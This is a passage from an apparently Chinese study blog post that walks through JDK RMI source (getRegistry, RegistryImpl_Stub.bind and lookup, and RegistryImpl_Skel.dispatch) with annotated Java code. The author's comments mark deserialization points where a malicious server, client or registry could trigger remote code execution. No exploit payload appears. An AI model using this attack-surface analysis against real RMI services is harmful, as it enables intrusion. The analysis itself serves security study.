punctuation">}</span></code></pre><p>也简单跟一下这个<code>getRegistry()</code>和<code>bind()</code>方法吧</p><p>首先是<code>getRegistry()</code>代码如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Registry <span class="token function">getRegistry</span><span class="token punctuation">(</span>String host<span class="token punctuation">,</span> <span class="token keyword">int</span> port<span class="token punctuation">,</span>                                       RMIClientSocketFactory csf<span class="token punctuation">)</span>        <span class="token keyword">throws</span> RemoteException    <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>port <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>            port <span class="token operator">=</span> Registry<span class="token punctuation">.</span>REGISTRY_PORT<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">==</span> null <span class="token operator">||</span> host<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// If host is blank (as returned by "file:" URL in 1.0.2 used in</span>            <span class="token comment" spellcheck="true">// java.rmi.Naming), try to convert to real local host name so</span>            <span class="token comment" spellcheck="true">// that the RegistryImpl's checkAccess will not fail.</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                host <span class="token operator">=</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetAddress<span class="token punctuation">.</span><span class="token function">getLocalHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// If that failed, at least try "" (localhost) anyway...</span>                host <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/*         * Create a proxy for the registry with the given host, port, and         * client socket factory.  If the supplied client socket factory is         * null, then the ref type is a UnicastRef, otherwise the ref type         * is a UnicastRef2.  If the property         * java.rmi.server.ignoreStubClasses is true, then the proxy         * returned is an instance of a dynamic proxy class that implements         * the Registry interface; otherwise the proxy returned is an         * instance of the pregenerated stub class for RegistryImpl.         **/</span>        LiveRef liveRef <span class="token operator">=</span>            <span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span>ObjID<span class="token punctuation">.</span>REGISTRY_ID<span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> csf<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        RemoteRef ref <span class="token operator">=</span>            <span class="token punctuation">(</span>csf <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span>liveRef<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef2</span><span class="token punctuation">(</span>liveRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>Registry<span class="token punctuation">)</span> Util<span class="token punctuation">.</span><span class="token function">createProxy</span><span class="token punctuation">(</span>RegistryImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> ref<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>关键点在在于后面这几行代码</p><pre class=" language-java"><code class="language-java">    LiveRef liveRef <span class="token operator">=</span>        <span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span>ObjID<span class="token punctuation">.</span>REGISTRY_ID<span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> csf<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    RemoteRef ref <span class="token operator">=</span>        <span class="token punctuation">(</span>csf <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span>liveRef<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef2</span><span class="token punctuation">(</span>liveRef<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>Registry<span class="token punctuation">)</span> Util<span class="token punctuation">.</span><span class="token function">createProxy</span><span class="token punctuation">(</span>RegistryImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> ref<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>和<code>LocateRegistry.createRegistry()</code>有那么点相似</p><p>最关键的在于下面这行</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//几乎一模一样 传递进去的第一个参数都是RegistryImpl.class，第二个参数</span><span class="token comment" spellcheck="true">//第二个参数是同样的UnicastRef里面又包含了一个同样的LiveRef，以及最后同样的false</span><span class="token keyword">return</span> <span class="token punctuation">(</span>Registry<span class="token punctuation">)</span> Util<span class="token punctuation">.</span><span class="token function">createProxy</span><span class="token punctuation">(</span>RegistryImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> ref<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>所以说从源码上分析 <code>LocateRegistry.getRegistry()</code>和<code>LocateRegistry.createRegistry()</code>最后的返回结果应该是一样的，我们看一下结果</p><p>![image-20200721223449017](个人学习过程中对RMI JRMP 以及JNDI的一些理解/4.png)</p><p>果然不出所料返回的同样都是RegistryImpl_Stub对象，只不过<code>LocateRegistry.getRegistry()</code>执行完不会在本地再开一个监听端口罢了。</p><p>好了 现在我们有了一个RegistryImpl_Stub对象，我们要用它来将我们的HelloImpl注册到rmiregistry中，用到的是<code>RegistryImpl_Stub.bind()</code>方法。</p><p>ok，hold on 我们先来了解一下这个<code>RegistryImpl_Stub</code>首先该类是继承了RemoteStub，并实现了Registry, Remote接口(我们的HelloImpl也实现了这个接口)，</p><p>该类的方法不多，就下面截图里这么些。没必要全都看，先看bind就行。</p><p>![image-20200721225231264](个人学习过程中对RMI JRMP 以及JNDI的一些理解/5.png)</p><p>bind方法详细代码如下</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//var1为字符串“hello”，var2就是咱们的HelloImpl对象</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bind</span><span class="token punctuation">(</span>String var1<span class="token punctuation">,</span> Remote var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> AccessException<span class="token punctuation">,</span> AlreadyBoundException<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//这个就不细跟了，想想也知道是用来进行TCP通信的，里面存了rmiregistry的地址信息，具体怎么实现没必要整这么细，第三个参数0关乎到rmiregistry的RegistryImpl_Skel的dispathc方法里的switch究竟case哪一个。</span>        RemoteCall var3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> operations<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 4905912898345647071L<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//创建一个ConnectionOutputStream对象</span>            ObjectOutput var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//序列化字符串“hello”</span>            var4<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//序列化HelloImpl对象</span>            var4<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MarshalException</span><span class="token punctuation">(</span><span class="token string">"error marshalling arguments"</span><span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//向rmiregistry发送序列化数据</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> var6<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> var7<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">AlreadyBoundException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> var8<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnexpectedException</span><span class="token punctuation">(</span><span class="token string">"undeclared checked exception"</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里需要注意下，这里向rmiregistry发送的是序列化信息，既然一方有序列化的行为那么另一方必然会有反序列化的行为。</p><p>到此为止服务端也就是远程方法服务方这边的操作暂且告一段落，因为此时我们的HelloImpl已经注册到了rmiregistry中。</p><p>接下来我们返回rmiregistry的代码，来看一看这边的情况。</p><p>之前跟踪rmiregistry这边的<code>LocateRegistry.createRegistry()</code>这段代码时有经过这样一行代码</p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//RegistryImpl_Stub继承自RemoteStub判断成功</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteStub</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//为Skeleton赋值，通过this.skel = Util.createSkeleton(var1)来进行赋值，最终Util.createSkeleton(var1)返回的结果为一个RegistryImpl_Skel对象，这个Skeleton后面也会讲</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setSkeleton</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个Skeleton就是前面流程里面的骨架，当执行完上面这两步的时候，UnicastServerRef的skel属性被赋值为一个RegistryImpl_Skel对象</p><p>![image-20200722135923833](个人学习过程中对RMI JRMP 以及JNDI的一些理解/6.png)</p><p>我们来看一下这个RegistryImpl_Skel的相关信息，首先该类实现了Skeleton接口，该类的方法很少，如下图所示</p><p>![image-20200722140806970](个人学习过程中对RMI JRMP 以及JNDI的一些理解/7.png)</p><p>其中最关键的方法就是dispatch方法，我们看下在Skeleton接口中对该方法的一个描述</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Unmarshals arguments, calls the actual remote object implementation, * and marshals the return value or any exception. * 解封装参数，调用实际远程对象实现，并封装返回值或任何异常。 * @param obj remote implementation to dispatch call to * @param theCall object representing remote call * @param opnum operation number * @param hash stub/skeleton interface hash * @exception java.lang.Exception if a general exception occurs. * @since JDK1.1 * @deprecated no replacement */</span><span class="token annotation punctuation">@Deprecated</span><span class="token keyword">void</span> <span class="token function">dispatch</span><span class="token punctuation">(</span>Remote obj<span class="token punctuation">,</span> RemoteCall theCall<span class="token punctuation">,</span> <span class="token keyword">int</span> opnum<span class="token punctuation">,</span> <span class="token keyword">long</span> hash<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span></code></pre><p>不难理解该方法就是对传入的远程调用信息进行分派调度的。其部分代码如下。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//之前在服务端时进行LocateRegistry.getRegistry().bind()操作时</span><span class="token comment" spellcheck="true">// RemoteCall var3 = this.ref.newCall(this, operations, 0, 4905912898345647071L);</span><span class="token comment" spellcheck="true">//在这一步中封装了四个参数 有三个在这里用到了 var3为0，var2为即为StreamRemoteCall，封装有“hello”字符串和HelloImpl对象的序列化信息。</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dispatch</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> RemoteCall var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var3<span class="token punctuation">,</span> <span class="token keyword">long</span> var4<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">==</span> 7583982177005850366L<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">==</span> 2571371476350237748L<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">==</span> <span class="token operator">-</span>7538657168040752697L<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">==</span> <span class="token operator">-</span>8381844669958460146L<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> 7305022919901907578L<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"invalid method hash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            var3 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> 4905912898345647071L<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SkeletonMismatchException</span><span class="token punctuation">(</span><span class="token string">"interface hash mismatch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//这个RegistryImpl会在rmiregistry运行期间一直存在，稍后会仔细讲解</span>    RegistryImpl var6 <span class="token operator">=</span> <span class="token punctuation">(</span>RegistryImpl<span class="token punctuation">)</span>var1<span class="token punctuation">;</span>    String var7<span class="token punctuation">;</span>    ObjectInput var8<span class="token punctuation">;</span>    ObjectInput var9<span class="token punctuation">;</span>    Remote var80<span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//var3的值为0，自然是case0</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>        RegistryImpl<span class="token punctuation">.</span><span class="token function">checkAccess</span><span class="token punctuation">(</span><span class="token string">"Registry.bind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//获取输入流</span>            var9 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//反序列化“hello”字符串</span>            var7 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//这个位置本来是属于反序列化出来的“HelloImpl”对象的，但是最终结果得到的是一个Proxy对像</span>              <span class="token comment" spellcheck="true">//这个很关键，这个Proxy对象即所为的Stub(存根)，客户端就是通过这个Stub来知道服务端的地址和端口号从                               而进行通信的。</span>              <span class="token comment" spellcheck="true">//这里的反序列化点很明显是我们可以利用的，通过RMI服务端执行bind，我们就可以攻击rmiregistry注                 册中心，导致其反序列化RCE</span>            var80 <span class="token operator">=</span> <span class="token punctuation">(</span>Remote<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> <span class="token operator">|</span> IOException var77<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"error unmarshalling arguments"</span><span class="token punctuation">,</span> var77<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            var2<span class="token punctuation">.</span><span class="token function">releaseInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//RegistryImpl对象有一个binding属性，是一个HashMap，这个HashMap里存储了所有注册了的远程调用方法的方法名，和其对应的stub。</span>        var6<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var80<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们来看一个这个binding属性里的详细信息</p><p>![image-20200722153059904](个人学习过程中对RMI JRMP 以及JNDI的一些理解/8.png)</p><p>从这里我们明白了rmiregistry的本质就是一个HashMap，所有注册过的远程方法以键值对的形式存放在这里，当客户端来查询时，rmiregistry将对应的键值对中的Proxy返回给客户端，这样客户端就知道了服务端的地址和所对应的端口号，就可以进行通信了。</p><p>服务端往rmiregistry进行注册这块已经分析差不多了，接下来看看客户端从rmiregistry中查询一直到服务端那里进行调用的过程。</p><p>首先客户端的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmiTest<span class="token punctuation">.</span>customer<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmiTest<span class="token punctuation">.</span>IHello<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMICustomer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException <span class="token punctuation">{</span>        IHello hello <span class="token operator">=</span> <span class="token punctuation">(</span>IHello<span class="token punctuation">)</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>LocateRegistry.getRegistry()</code>没必要再分析一遍了，直接看lookup方法，部分代码如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Remote <span class="token function">lookup</span><span class="token punctuation">(</span>String var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> AccessException<span class="token punctuation">,</span> NotBoundException<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//可以看到这次传递的第三个参数就不是0而是2了，同样的返回一个StreamRemoteCall对象</span>        RemoteCall var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> operations<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> 4905912898345647071L<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//同样的生成一个ConnectionOutputStream对象</span>            ObjectOutput var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//序列化“hello”字符串</span>            var3<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var17<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MarshalException</span><span class="token punctuation">(</span><span class="token string">"error marshalling arguments"</span><span class="token punctuation">,</span> var17<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//和rmiregistry进行通信查询</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>        Remote var22<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//获取rmiregistry返回的输入流</span>            ObjectInput var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//反序列化返回的Stub</span>              <span class="token comment" spellcheck="true">//同样在反序列化rmiregistry返回的Stub时这个点我们也可以利用lookup方法，理论上，我们可以在客                            户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端</span>            var22 <span class="token operator">=</span> <span class="token punctuation">(</span>Remote<span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> var22<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>这里又提到了Stub我们来看看其反序列化完成后是什么样的吧</p><p>![image-20200722161414247](个人学习过程中对RMI JRMP 以及JNDI的一些理解/9.png)</p><p>和之前在rmiregistry中看到的那个HashMap中的值一模一样，这下客户端就知道服务端的地址和端口号了，通过这些信息就可以和服务端进行通信了。</p><p>不过在此之前在看一下rmiregistry是怎么处理客户端的查询信息的。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//为什么走case2 这里就不再重提了</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//获取客户端传来的输入流</span>        var8 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//反序列化字符串“hello”</span>          <span class="token comment" spellcheck="true">//同样在反序列化客户端传来的查询数据时，这个点我们也可以利用lookup方法，理论上，我们可以在客                            户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端</span>          <span class="token comment" spellcheck="true">//尽管lookup时客户端似乎只能传递String类型，但是还是那句话，只要后台不做限制，客户端的东西皆可控</span>        var7 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var8<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> <span class="token operator">|</span> IOException var73<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"error unmarshalling arguments"</span><span class="token punctuation">,</span> var73<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>        var2<span class="token punctuation">.</span><span class="token function">releaseInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//调用RegistryImpl.lookup方法，返回的查询结果就是hello所对应的那个Proxy对象</span>    var80 <span class="token operator">=</span> var6<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//实例化一个输出流</span>        ObjectOutput var82 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getResultStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//序列化Proxy对象</span>        var82<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>var80<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var72<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token 